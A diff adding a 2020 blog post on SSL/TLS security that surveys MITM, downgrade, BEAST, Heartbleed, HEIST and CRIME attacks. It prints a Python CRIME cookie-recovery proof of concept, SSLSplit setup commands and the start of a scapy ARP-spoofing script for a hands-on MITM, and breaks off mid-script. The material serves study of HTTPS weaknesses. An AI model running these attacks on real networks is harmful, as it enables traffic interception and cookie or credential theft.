@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Security Research for SSL&#x2F;TLSAbstractThis article is a security study of SSL&#x2F;TLS, involving HTTPS hijacking and traffic sniffing. This article summarizes the attack methods that can now be used for SS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Security Research for SSL&#x2F;TLS">
+<meta property="og:url" content="https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/index.html">
+<meta property="og:site_name" content="喵了个咪乎 Cat My Dog">
+<meta property="og:description" content="Security Research for SSL&#x2F;TLSAbstractThis article is a security study of SSL&#x2F;TLS, involving HTTPS hijacking and traffic sniffing. This article summarizes the attack methods that can now be used for SS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527142803.png">
+<meta property="og:image" content="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527143729.png">
+<meta property="og:image" content="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527144702.png">
+<meta property="og:image" content="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527162341.png">
+<meta property="article:published_time" content="2020-05-28T10:13:52.000Z">
+<meta property="article:modified_time" content="2020-06-02T15:45:03.000Z">
+<meta property="article:author" content="Toky">
+<meta property="article:tag" content="Cyber Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527142803.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Security Research for SSL/TLS</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="喵了个咪乎 Cat My Dog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
+         
+          <li><a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a></li>
+         
+          <li><a href="https://cissp-wiki.ml/" target="_blank" rel="noopener">CISSP学习指南</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/06/02/security/%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%A6%82%E8%A7%88/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/28/PWNABLE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&text=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&is_video=false&description=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Security Research for SSL/TLS&body=Check out this article: https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&name=Security Research for SSL/TLS&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&t=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Research-for-SSL-TLS"><span class="toc-number">1.</span> <span class="toc-text">Security Research for SSL&#x2F;TLS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Abstract"><span class="toc-number">1.1.</span> <span class="toc-text">Abstract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Keywords"><span class="toc-number">1.2.</span> <span class="toc-text">Keywords</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.3.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Principle-of-SSL-TLS"><span class="toc-number">1.4.</span> <span class="toc-text">The Principle of SSL&#x2F;TLS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Attack-Techniques-for-SSL-TLS"><span class="toc-number">1.5.</span> <span class="toc-text">Vulnerability Attack Techniques for SSL&#x2F;TLS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Man-in-the-Middle-Attack"><span class="toc-number">1.5.1.</span> <span class="toc-text">Man-in-the-Middle Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Downgrade-Attack"><span class="toc-number">1.5.2.</span> <span class="toc-text">Downgrade Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BEAST-Attack"><span class="toc-number">1.5.3.</span> <span class="toc-text">BEAST Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heartbleed-Attack"><span class="toc-number">1.5.4.</span> <span class="toc-text">Heartbleed Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HEIST-Attack"><span class="toc-number">1.5.5.</span> <span class="toc-text">HEIST Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRIME-Attack"><span class="toc-number">1.5.6.</span> <span class="toc-text">CRIME Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Case-Analysis-and-Actual-Combat"><span class="toc-number">1.6.</span> <span class="toc-text">Case Analysis and Actual Combat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Prepare"><span class="toc-number">1.6.1.</span> <span class="toc-text">(1) Prepare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Data-traffic-redirection"><span class="toc-number">1.6.2.</span> <span class="toc-text">(2) Data traffic redirection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-MITM"><span class="toc-number">1.6.3.</span> <span class="toc-text">(3) MITM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Conclusion"><span class="toc-number">1.6.4.</span> <span class="toc-text">(4) Conclusion</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Protection-Recommendations"><span class="toc-number">1.7.</span> <span class="toc-text">Protection Recommendations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Choose-a-good-certificate-authority"><span class="toc-number">1.7.1.</span> <span class="toc-text">Choose a good certificate authority</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Select-the-strong-algorithm-signature-certificate"><span class="toc-number">1.7.2.</span> <span class="toc-text">Select the strong algorithm signature certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Use-secure-cipher-suite"><span class="toc-number">1.7.3.</span> <span class="toc-text">Use secure cipher suite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Luauch-HSTS-preload"><span class="toc-number">1.7.4.</span> <span class="toc-text">Luauch HSTS preload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Support-high-level-security-requirements"><span class="toc-number">1.7.5.</span> <span class="toc-text">Support high level security requirements</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.8.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Security Research for SSL/TLS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">喵了个咪乎 Cat My Dog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-28T10:13:52.000Z" itemprop="datePublished">2020-05-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/security/">security</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Security-Research-for-SSL-TLS"><a href="#Security-Research-for-SSL-TLS" class="headerlink" title="Security Research for SSL/TLS"></a>Security Research for SSL/TLS</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>This article is a security study of SSL/TLS, involving HTTPS hijacking and traffic sniffing. This article summarizes the attack methods that can now be used for SSL/TLS decryption, as well as the methods used for HTTPS hijacking. It also provides a case of man-in-the-middle attack. Finally, several suggestions are made to enhance the security of SSL/TLS and HTTPS.</p>
+<h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>SSL/TLS, HTTPS Hijacking, HTTPS Security</p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>There may be security issues such as information stealing or identity disguise in the HTTP protocol. Using the HTTPS communication mechanism can effectively prevent these problems.<br>But HTTPS is not a new protocol for the application layer, it is just a part of the HTTP communication interface replaced by SSL and TLS protocols.<br>Therefore, the security research of HTTPS is largely the research of SSL/TLS protocol.<br>With the popularity of HTTPS, a number of new ways of attacking HTTPS are emerging, and security issues ranging from individuals to countries are being discussed.<br>In this article, we will introduce the attack methods against HTTPS, add actual cases, and put forward some protection Suggestions.</p>
+<h2 id="The-Principle-of-SSL-TLS"><a href="#The-Principle-of-SSL-TLS" class="headerlink" title="The Principle of SSL/TLS"></a>The Principle of SSL/TLS</h2><p>The main function of the HTTPS protocol is largely dependent on the  SSL/TLS protocol, the realization of the function of the  SSL/TLS rely mainly on the three kinds of basic algorithms: hash function, symmetric encryption and asymmetric encryption, <strong>the identity authentication and key agreement by using asymmetric encryption, symmetric encryption algorithm using the key agreement for data encryption, verify the integrity of information based on hash function</strong>.[1]</p>
+<p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527142803.png"></p>
+<p>Fig. Diagram of how SSL/TLS works</p>
+<p>HTTPS use a hybrid encryption mechanism that uses oth symmetric and asymmetric encryption.</p>
+<p>The specific method is as follows: the party sending the ciphertext uses the public key of the other party to encrypt the “symmetric key”, and then the other party decrypts the “symmetric key” with its private key, so as to ensure that the exchanged key is safe, and then uses the symmetric encryption method to communicate.</p>
+<p>In order to further guarantee the integrity of data transmission process, digital signature verification is added.</p>
+<p>The receiver can decrypt the encrypted digest message only with the sender’s public key, and then use the HASH function to generate a digest message for the received text, compared with the digest message obtained in the previous step.If it is the same, it means that the received information is complete and has not been modified during transmission, otherwise it means that the information has been modified, so the digital signature can verify the integrity of the information.[1]</p>
+<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527143729.png" style="zoom:50%;" />
+
+<p>Fig. Message Digest in Information security[2]</p>
+<p>From the figure above, we can see how the message digest works, but one of the most important questions is: How to prove that the public key came from the real sender?</p>
+<p>So, the certificate authority(CA) is required to prove the ownership of the public key.</p>
+<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527144702.png" style="zoom: 80%;" />
+
+<p>Fig. Diagram of the certificate authority[3]</p>
+<h2 id="Vulnerability-Attack-Techniques-for-SSL-TLS"><a href="#Vulnerability-Attack-Techniques-for-SSL-TLS" class="headerlink" title="Vulnerability Attack Techniques for SSL/TLS"></a>Vulnerability Attack Techniques for SSL/TLS</h2><p>Next section will describes some ways to attack SSL/TLS vulnerabilities.</p>
+<h3 id="Man-in-the-Middle-Attack"><a href="#Man-in-the-Middle-Attack" class="headerlink" title="Man-in-the-Middle Attack"></a>Man-in-the-Middle Attack</h3><p>MITM (Man - in - the - Middle Attack), is refers to the ends of the attacker and communications create a separate connection respectively, and the exchange of all its received data, make communication both sides of the think that they are connected via a private talk directly with each other, but in fact the entire conversation is completely controlled by the attacker.</p>
+<p>In the middle attack, an attacker can intercept the communication on both sides of the end even insert the new content. </p>
+<p>A man-in-the-middle attack can succeed only if the attacker can disguise himself as the terminal of each participating session without being detected by other terminals.</p>
+<h3 id="Downgrade-Attack"><a href="#Downgrade-Attack" class="headerlink" title="Downgrade Attack"></a>Downgrade Attack</h3><p>Downgrade Attack, is an attack on a computer system or communication protocol. In a downgrade attack, the attacker deliberately makes the system give up the new, high-security working mode and use the old, low-security working mode prepared for backward compatibility.</p>
+<p>Degradation attacks are often used as man-in-the-middle attacks to weaken the security of encrypted communication protocols.[4]</p>
+<h3 id="BEAST-Attack"><a href="#BEAST-Attack" class="headerlink" title="BEAST Attack"></a>BEAST Attack</h3><p>The BEAST attack exploits a vulnerability in the way the TLS 1.0 protocol generates initialization vectors for block cipher in CBC mode (cve-2011-3389).<br>Combined with clever manipulation of block boundaries, this vulnerability allows a man-in-the-middle attacker to sniff out encrypted traffic without having to perform any decryption to find a small amount of information and exploit the vulnerability regardless of the type and strength of the block password.</p>
+<h3 id="Heartbleed-Attack"><a href="#Heartbleed-Attack" class="headerlink" title="Heartbleed Attack"></a>Heartbleed Attack</h3><p>The Heartbleed Bug(CVE-2014-0160) is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet.</p>
+<p>The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.[5]</p>
+<h3 id="HEIST-Attack"><a href="#HEIST-Attack" class="headerlink" title="HEIST Attack"></a>HEIST Attack</h3><p>HEIST(Encrypted Information can be Stolen through TCP-Windows) takes advantage of the fact that HTTPS responses depend on TCP.<br>Once the attacker knows the size of the encrypted response data, he can optionally extract the plaintext information contained in the data using one of two previously designed vulnerabilities.</p>
+<p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527162341.png"></p>
+<p>Fig. A demo show how the HEIST attack[6]</p>
+<h3 id="CRIME-Attack"><a href="#CRIME-Attack" class="headerlink" title="CRIME Attack"></a>CRIME Attack</h3><p>The CIME attack works by running JavaScript code in the victim’s browser, listening for HTTPS data through a middleman component, and decrypting session cookies by looking for differences in the cipher text for each cracked request and response.</p>
+<p>Next is the POC(Proof Of Concept) of CRIME attack[7].</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">charset = string.letters + string.digits + <span class="string">"%/+="</span></span><br><span class="line"></span><br><span class="line">COOKIE = <span class="string">''</span>.join(random.choice(charset) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">HEADERS = (<span class="string">"POST / HTTP/1.1\r\n"</span></span><br><span class="line">       <span class="string">"Host: thebankserver.com\r\n"</span></span><br><span class="line">           <span class="string">"Connection: keep-alive\r\n"</span></span><br><span class="line">           <span class="string">"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"</span></span><br><span class="line">           <span class="string">"Accept: */*\r\n"</span></span><br><span class="line">           <span class="string">"Referer: https://thebankserver.com/\r\n"</span></span><br><span class="line">           <span class="string">"Cookie: secret="</span> + COOKIE +  <span class="string">"\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Encoding: gzip,deflate,sdch\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Language: en-US,en;q=0.8\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"</span></span><br><span class="line">           <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">BODY = (<span class="string">"POST / HTTP/1.1\r\n"</span></span><br><span class="line">           <span class="string">"Host: thebankserver.com\r\n"</span></span><br><span class="line">           <span class="string">"Connection: keep-alive\r\n"</span></span><br><span class="line">           <span class="string">"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"</span></span><br><span class="line">           <span class="string">"Accept: */*\r\n"</span></span><br><span class="line">           <span class="string">"Referer: https://thebankserver.com/\r\n"</span></span><br><span class="line">           <span class="string">"Cookie: secret="</span></span><br><span class="line">         )</span><br><span class="line"></span><br><span class="line">BODY_SUFFIX=(<span class="string">"\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Encoding: gzip,deflate,sdch\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Language: en-US,en;q=0.8\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"</span></span><br><span class="line">           <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compress</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">    c = zlib.compressobj()</span><br><span class="line">    <span class="keyword">return</span> c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findnext</span><span class="params">(b,bs,charset)</span>:</span></span><br><span class="line">    <span class="comment">#print "body len",len(b)</span></span><br><span class="line">    baselen = len(compress(HEADERS +</span><br><span class="line">                      b +</span><br><span class="line">                      bs))</span><br><span class="line"></span><br><span class="line">    possible_chars = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        length = len(compress(HEADERS +</span><br><span class="line">                      b +</span><br><span class="line">                      c +</span><br><span class="line">                      bs))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print repr(c), length, baselen</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> length &lt;= baselen:</span><br><span class="line">            possible_chars.append(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print '=', possible_chars</span></span><br><span class="line">    <span class="keyword">return</span> possible_chars</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Original cookie: %s"</span> % COOKIE</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Leaked cookie  : %s"</span> % cookie</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    <span class="keyword">while</span> len(cookie) &lt; len(COOKIE):</span><br><span class="line">        chop = <span class="number">1</span></span><br><span class="line">        possible_chars = findnext(BODY + cookie, <span class="string">""</span>, charset)</span><br><span class="line">        body_tmp = BODY</span><br><span class="line">        orig = possible_chars</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> len(possible_chars) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> len(body_tmp) &lt; chop:</span><br><span class="line">                <span class="comment">#print "stuck at", possible_chars</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            body_tmp = body_tmp[chop:]</span><br><span class="line">            possible_chars = findnext(body_tmp + cookie, <span class="string">""</span>, orig)</span><br><span class="line"></span><br><span class="line">        cookie = cookie + possible_chars[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> BODY.find(<span class="string">"\r\n"</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> forward():</span><br><span class="line">        cookie = cookie[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(cookie) &gt;= len(COOKIE):</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"reducing body"</span></span><br><span class="line">    BODY = BODY[BODY.find(<span class="string">"\r\n"</span>) + <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Case-Analysis-and-Actual-Combat"><a href="#Case-Analysis-and-Actual-Combat" class="headerlink" title="Case Analysis and Actual Combat"></a>Case Analysis and Actual Combat</h2><p>Next, we’ll use the SSLSplit tool for the MITM attack, which is shown in the attachment.</p>
+<h3 id="1-Prepare"><a href="#1-Prepare" class="headerlink" title="(1) Prepare"></a>(1) Prepare</h3><p>Next, we shoule git clone the tools “SSLSplit”  source, compile and install</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/droe/sslsplit.git /opt/sslsplit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install libssl-dev libevent-dev</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-Data-traffic-redirection"><a href="#2-Data-traffic-redirection" class="headerlink" title="(2) Data traffic redirection"></a>(2) Data traffic redirection</h3><p>Here we use the classic ARP attack to redirect network data.<br>The following is an example of a Python implementation of ARP attacks. Of course, you can also use tools such as <code>arpspoof</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> ARP,send</span><br><span class="line"><span class="keyword">import</span> os,re,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gateway_ip</span><span class="params">()</span>:</span></span><br><span class="line">    t=os.popen(<span class="string">'route -n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(<span class="string">'0.0.0.0'</span>):</span><br><span class="line">            r=re.split(<span class="string">"\s+"</span>,i)</span><br><span class="line">            <span class="keyword">return</span> r[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gateway_hw</span><span class="params">(ip)</span>:</span></span><br><span class="line">    t=os.popen(<span class="string">'arp -e %s'</span> % ip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(ip):</span><br><span class="line">            r=re.split(<span 